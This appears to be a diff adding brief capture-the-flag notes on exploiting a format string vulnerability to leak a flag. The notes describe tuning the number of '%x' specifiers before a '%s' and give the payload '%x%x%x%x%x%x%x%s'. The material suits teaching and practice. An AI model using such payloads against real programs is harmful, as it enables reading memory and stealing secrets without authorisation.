@@ -1,0 +1,13 @@
+this one has a format string vulnerability
+
+want to leak out and print the flag
+using %x and %s to find the right offset
+
+through trial and error adjust the amount of '%x" followed by one '%s'
+
+print '%x'*7 + '%s'
+
+%x%x%x%x%x%x%x%s
+
+
+
